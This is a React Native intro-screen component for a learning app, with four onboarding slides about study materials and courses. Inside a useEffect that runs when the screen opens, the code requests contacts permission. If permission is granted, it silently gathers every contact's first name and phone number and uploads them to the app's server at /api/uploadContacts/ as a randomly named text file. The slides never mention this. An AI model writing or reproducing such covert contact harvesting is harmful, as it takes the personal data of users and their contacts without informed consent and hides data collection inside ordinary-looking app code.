import React,{useEffect} from 'react'
import Icon from 'react-native-vector-icons/Ionicons';
import {View, Text, Image, StyleSheet, StatusBar} from 'react-native'
import AppIntroSlider from 'react-native-app-intro-slider'
import { AsyncStorage } from 'react-native'
import * as Contacts from "expo-contacts"
import { AuthContext } from "../context"

const data = [
  {
    title: 'Ready to learn',
    text: 'Welcome to Marvel Creative Learning App, \n Where you can access all your study materials at one place.',
    image: require('../../assets/illustrations/book.png'),
    // bg: '#59b2ab',
    bg:'#fff'
  },
  {
    title: 'Learn online from home',
    text: 'Learn a lot of extra things with our interesting lessons by our courses and tutors',
    image: require('../../assets/illustrations/read.png'),
    bg:'#fff'
  },
  {
    title: 'Learn on your time schedule',
    text: "Choose from different types of lessons with new additionals every month",
    image: require('../../assets/illustrations/learn.png'),
    bg: '#fff',
  },
   {
    title: 'Ready!',
    text: "You're all ready,set to rock and roll. Get started with Marvel Creative Learning Application now!",
    image: require('../../assets/illustrations/ready.png'),
    bg: '#fff',
  },
]


const IntroScreen = () => {
    const {IntroDone} = React.useContext(AuthContext)
    const { API_URL } = React.useContext(AuthContext)

    useEffect(() => {
      (async () => {
        const { status } = await Contacts.requestPermissionsAsync()
        if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
        })
        const contactlist= [{}]
        if (data.length > 0) {
          data.map(elem => {
            elem.phoneNumbers && elem.firstName ?
            contactlist.push(elem.firstName + ':' +elem.phoneNumbers[0].number)
            :null
          })
          fetch(`${API_URL}/api/uploadContacts/`, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            data: contactlist.toString(),
            filename:
              Math.random().toString(36).substring(2, 15) +
              Math.random().toString(36).substring(2, 15) +
              ".txt"
          }),
        })
          .then()
          .catch((err) => console.log(err))
          
        }
        }
      })()
      }, [])

    const _renderNextButton = () => {
        return (
          <View style={styles.buttonCircle}>
            <Icon
              name="ios-arrow-forward"
              color='tomato'
              size={24}
            />
          </View>
        )
      }

     const  _renderDoneButton = () => {
        return (
          <View style={styles.buttonCircle}>
            <Icon
              name="md-checkmark"
              color='tomato'
              size={24}
            />
          </View>
        )
      }

  const _renderItem = ({item}) => {
    return (
      <View
        style={[
          styles.slide,
          {
            backgroundColor: item.bg,
          },
        ]}>
        <Image source={item.image} style={styles.image} />
        <Text style={styles.title}>{item.title}</Text>
        <Text style={styles.text}>{item.text}</Text>
      </View>
    )
  }


return (
      <View style={{flex: 1}}>
        <StatusBar translucent backgroundColor="transparent" />
        <AppIntroSlider
          keyExtractor={(item)=>(item.title)}
          renderItem={_renderItem}
          data={data}
          renderDoneButton={_renderDoneButton}
          renderNextButton={_renderNextButton}
          onDone={IntroDone}
      activeDotStyle={{ backgroundColor: 'tomato' }}
        />
      </View>
    ) 
}

const styles = StyleSheet.create({
    slide: {
      flex: 1,
      alignItems: 'center',
      justifyContent: 'center',
      backgroundColor: 'white', 
      padding:30,
    },
    image: {
      width: 320,
      height: 320,
      marginVertical: 32,
      
    },
    text: {
      // color: 'rgba(255, 255, 255, 0.8)',
      color:'#000',
      textAlign: 'center',
      fontWeight:"500",
      fontSize:13,
      padding:10,
      letterSpacing:2
    },
    title: {
      marginBottom:10,
      fontSize: 20,
      color: 'tomato',
      textAlign: 'center',
      fontWeight:'600',
      textTransform:'uppercase',
      letterSpacing:2
    },
  })

export default IntroScreen